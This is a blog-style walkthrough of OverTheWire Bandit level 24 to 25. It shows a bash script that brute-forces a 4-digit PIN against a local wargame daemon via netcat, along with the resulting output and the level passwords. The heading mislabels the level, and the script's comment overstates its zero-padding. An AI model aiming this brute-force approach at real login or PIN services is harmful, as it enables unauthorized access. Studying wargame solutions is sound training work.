---
title: "Bandit: Level 24 - Level 25"
date: 2024-09-12 15:00:00 -500 
categories: [OvertheWire, Bandit]
tags: [linux,wargames,bandit,overthewire]
author: Christoph K
---
<!-- Change LEVELS -->

### Level 23

**Username:** `bandit24`  
**Password:** `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

### Task:
https://overthewire.org/wargames/bandit/bandit25.html

<!-- PICTURE FROM TASK -->

    A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
    You do not need to create new connections each time
<!-- change username bandit!! -->


### Start

Let's begin by connecting to the server `bandit.labs.overthewire.org` and logging in with user `bandit24` on port `2220`.



<!-- CHANGE COMMANDS IF NECCESSARY -->


### Solve the level

Okay we have to write another script, which sends a 4-digit-number with password to a connection on port `30002`.

The first thing we should do is that we have to understand the process which we try to automate.

Therefore we open a connection to port `30002` via `netcat`.

```bash

bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

```
Okay we have to enter the password and then the pin code. 

Like: 
`gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001`

Lets try to create a script here.

```bash

#!/bin/bash

for i in {0..9999} 
do 
	echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> bruteforce.txt
done

nc localhost 30002 < bruteforce.txt

```
- shebang `#!/bin/bash`
- we do a `for` iteration and try all combinations from 0001-9999
- in our `for`iteration we create our `bruteforce file` 
- with our `bruteforce file` we can now take it as input with `<`


Result:

```bash

Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

```

We got it.

Password: `iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`

### Note:

This script is on purpose written very easy. Of course there are many better ways to write that. But this was my first try in this task and it worked with this script! :) 


